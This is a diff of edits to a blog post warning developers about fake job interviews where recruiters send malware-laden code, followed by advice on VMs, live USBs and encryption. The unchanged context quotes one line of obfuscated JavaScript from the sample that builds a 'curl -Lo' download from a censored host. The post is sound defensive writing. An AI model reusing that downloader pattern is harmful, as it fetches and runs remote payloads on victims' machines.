@@ -31,7 +31,7 @@ Our friend was like George, curious, so he reformated the code and found:
 - [API calls to an IP address](/en/basic-characteristics-of-an-api-rest-api/), with no domain, some with no response at all and some that download obfuscated Python scripts (I guess it follows up the hacking process by installing a backdoor or some RAT).
 
 
-If you want to ~~infect yourself~~ read the code, visit [the github repository](https://gist.github.com/jbrit/9a6525d086411a0fcffea202f368e780#file-initial-obfuscated-iife-js#?), I take no responsibility for anything.
+If you want to ~~infect yourself~~ read the code, visit [the github repository](https://gist.github.com/jbrit/9a6525d086411a0fcffea202f368e780#file-initial-obfuscated-iife-js#?), I take no responsibility for anything though.
 
 ``` javascript
 _0x42b722(“curl -Lo” + _0x157519 + “\” + “http://<censored>/pdown” + “\””, (_0x204dd7, _0x6e1c16, _0x52b515) => {
@@ -51,25 +51,25 @@ The most comfortable option, but also the most expensive, keep your devices sepa
 
 **Read the code, whenever possible**.
 
-Recruiter sends you a script? Examine it carefully before you run it. Yes, I know, sometimes the code is too long or obfuscated, but if you have some experience, you can quickly examine the screen with your eyes and spot the most obvious red flags. Of course, you can't waste all afternoon on this either especially if you're in a real interview or value your time.
+Recruiter sends you a script? Examine it carefully before you run it. Yes, I know, sometimes the code is too long or obfuscated, but if you have some experience, you can rapidly examine the screen with your eyes and spot the most obvious red flags. Of course, you can't waste all afternoon on this especially if you're in a real interview or value your time.
 
 ### **Use a virtual machine**.
 
 Mount a virtual machine, either Virtual Box or Gnome Boxes, on Linux, or a [completely isolated Docker container](/en/the-most-useful-and-basic-docker-commands/), if you don't mind not having a graphical interface. 
 
-Another option available, and my favorite: a live USB with the distribution of your choice (Debian, Fedora, or whatever you want), 
+Another option available, and my personal favorite: a live USB with the distribution of your choice (Debian, Fedora, or whatever you want), 
 
-That way, the worst that can happen is that they infect your virtual machine and not your real computer with all your personal information. Just be careful with shared volumes! If you mount your hard drive in the VM, you're toast.
+That way, the worst that can happen is that they infect your virtual machine and not your real computer with all your personal information. Just be careful with shared volumes! If you mount the hard drive that contains sensitive information in the VM, you're toast.
 
 **Encrypt your sensitive information**.
 
-Here comes in the classic advice from old-school IT veterans: **encrypt your important data**. If someone manages to access your collection of kitten memes, encrypt them. 
+Here comes in the classic advice from old-school IT veterans: **encrypt your important data**. If someone manages to access your collection of kitten memes,it will be just a garbage of non-sense zeroes and ones. 
 
-I don't plan to offer details because there is already too much on the internet, Google GPG or read the manual directly, if you are not that familiar with the terminal or don't care, there are tools like Kleopatra, which make cryptography more intuitive to use.
+I don't plan to offer details because there is already too much information on the internet about GPG and its alternatives, Google GPG or read the manual directly, if you are not that familiar with the terminal or don't want to become a Linux or math nerd, there are tools like Kleopatra, which could make cryptography more intuitive to use.
 
 ## Don't run arbitrary code on your personal machine.
 
-Do you have better ideas to protect us from these practices? Drop your tips on social media and tag me. I look forward to adding your suggestions to the post. 
+Do you have better ideas to protect us from black hat interviews? Drop your tips on social media and tag me. I look forward to adding your suggestions to the post. 
 
 If you want to read the full story give Elon's blog a visit.... I mean X.
 
